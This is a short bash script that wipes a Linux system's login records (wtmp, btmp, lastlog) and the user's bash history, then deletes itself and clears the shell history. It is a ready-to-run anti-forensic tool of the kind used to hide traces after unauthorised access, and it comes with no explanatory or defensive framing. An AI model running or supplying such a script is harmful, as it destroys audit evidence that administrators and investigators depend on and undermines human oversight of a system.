#!/usr/bin/env bash

echo "Clearing Login"
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
echo > ~/.bash_history
echo "Emptying"
echo "Deleting Script"
rm -rf /tmp/empty_login_history.sh
history -c
echo "Done"
